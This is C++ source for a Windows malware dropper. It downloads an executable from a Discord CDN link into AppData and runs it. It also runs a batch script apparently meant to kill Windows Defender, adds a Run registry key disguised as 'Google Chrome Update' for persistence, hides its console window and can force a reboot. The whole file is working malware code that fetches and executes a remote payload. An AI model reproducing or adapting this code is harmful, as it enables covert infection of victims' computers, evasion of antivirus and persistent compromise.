#include "includes.h"
#include "Dropper.h"

const char* progPath = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Something.exe";

void Dropper::Init(Config config)
{
	//system(progPath);

	if (config.Drop == true)
		DropMalware();
	if (config.Persistence == true)
		Persistence();
	if (config.RestartPC == true)
		RestartPC();
	if (config.HideConsoleWindow == true)
		HideConsoleWD();
}
void Dropper::DropMalware()
{
	/* Bypasses Windows Defender(just kills it)(* not fud) credits goes to @swagkarna
	// https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2/main/Defeat-Defender.bat
	HRESULT hr = URLDownloadToFile(NULL, _T("https://raw.githubusercontent.com/swagkarna/Defeat-Defender-V1.2/main/Defeat-Defender.bat"),
		_T("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\bypass.bat"), 0, NULL);
	*/
	system("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\bypass.bat");
	// Downloads and saves malware
	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/977269828966559846/988461384973033522/programa.exe"),
		_T("C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Something.exe"), 0, NULL);

	// Run dropped file
	system(progPath);
}
void Dropper::Persistence()
{
	// Persistance
	std::wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Something.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); // Creates a key
	LONG status = RegSetValueEx(hkey, "Google Chrome Update", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}
void Dropper::RestartPC()
{
	system("shutdown /r /t 0");
}
void Dropper::HideConsoleWD()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}
void Dropper::ShowConsoleWD()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}